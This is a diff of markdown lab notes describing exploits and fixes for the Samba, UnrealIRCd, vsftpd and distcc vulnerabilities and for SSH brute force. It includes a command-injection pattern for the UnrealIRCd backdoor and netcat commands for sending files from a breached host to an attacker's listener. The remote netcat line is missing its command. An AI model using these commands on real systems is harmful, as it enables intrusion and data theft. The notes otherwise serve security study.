@@ -21,27 +21,38 @@ When presenting these examples I will be going through these steps
 ### SAMBA CVE-2007-2447 
 - Version: 3.0.20 < 3.0.25rc3
 - Desc: Samba is a software that is a re-implmentation of the SMB networking protocol. This software provides file and print services for all clients as long as they are using the SMB protocol.
-- Exploit: If Samba is configured to use the non-default username map script, anyone can send arbitrary commands in disguise as a username to the server. The command will then be run without needing authorization.
-- Fix: 
+- Exploit: If Samba is configured to use the username map script, anyone can send arbitrary commands in disguise as a username to the server. The data sent to the targeted machine is not sanitized. The command will then be run without needing authorization.
+- Fix: To fix this, the user can update to a new version. If they are still on the older version, the user can navigate to /etc/samba/smb.conf on the vulnerable machine. The user can then either comment out or remove the line "username map script = /etc/samba/scripts/mapusers.sh". 
 
-### UnrealRCD CVE-2010-2075
+### UnrealIRCd CVE-2010-2075
 - Version: 3.2.8.1 
-- Desc: UnrealRCD is a daemon for Internet Realy Chat usage in order to provide chat services.
-- Exploit: UnrealRCD contains an exploit where it will execute any command send to the service if it begins with the string 'AB'. Ex: AB; [command to run]
-- Fix:
+- Desc: UnrealIRCD is a daemon for Internet Realy Chat usage in order to provide chat services.
+- Exploit: UnrealIRCD contains an exploit where it will execute any command with the priviledges of the user that is running the service if it begins with the string 'AB'. Ex: AB; [command to run].
+- Exploit Cont: This exploit was introduced because someone had replaced all UnrealIRCD file download options on their mirror sites with a version that had a trojan in it.
+- Fix: The only way to fix this exploit is to redownload a legitamate version of Unreal. This is because the backdoor is located in the "core" of the service (according to the developers).
 
 ### VSFTP CVE-2011-2523
 - Version: 2.3.4
 - Desc: VSFTP is an FTP server for linux. 
-- Exploit: The exploit occurs when a user tries to login with a username that ends with ':)'. This opens a shell on port 6200, allowing the attacker unauthenticated access.
-- Fix:
+- Exploit: There was a backdoor built into the VSFTP service that allows someone to gain root access to a targeted machine if they login with a username that has ':)'. This opens a shell on port 6200, allowing the attacker unauthenticated access.
+- Fix: The individual could update the the service or if they are still running on the version with the backdoor, they could set up an iptable to drop unused ports. (Which should be done anyways). Ex: iptables -A INPUT -p tcp --dport 6200 -j DROP and iptables -A INPUT -p udp --dport 6200 -j DROP
 
 ### SSH (BRUTE FORCE EXAMPLE)
 - Version: Any.
 - Desc: The SSH service allows for communication between a computer network. 
-- Exploit: This is less of an exploit and more of poor system security. Users can prevent brute force attacks by incorporating a proper firewall to filter out ip addresses, using public key authentication, using strong and unqiue passwords, etc....
+- Exploit: This is less of an exploit and more of poor system security and poor cyber security practices.
+- Fix: Use strong passwords that can not be easily guessed. A more secure option would be to set up ssh key pairs.
 
-## Post-Exploitation Example:
+### DistCC CVE-2004-2687
+- Version: 
+- Desc: Distccd is a service that allows for a faster compilation time of C programs by distributing the compilation tasks across multiple different machines where it is able to find resources to do so.
+- Exploit: DistCCD has a vulnerability that allows an attacker to execute arbitray commands on the targeted system. This is because the distccd daemon improperly handles commands send to it as a compilation request.
+- Fix: Other than updating distccd to a version where the exploit has been patched, the user can configure distccd to only accept connection from trusted hosts through the use of a custom firewall configuration.
+
+### 
+
+
+## Post-Exploitation Examples:
 - After gaining access to the remote system and starting a shell session, the user can manually use netcat to search for a specified file. Here is an example:
   - Open a terminal on the local host and run "nc -lnvp [portnum] > [file for info to be stored]"
   - On the remote machine (the breached machine) run the command " [IP of local machine] [portnum] < [file path to be retrieved]
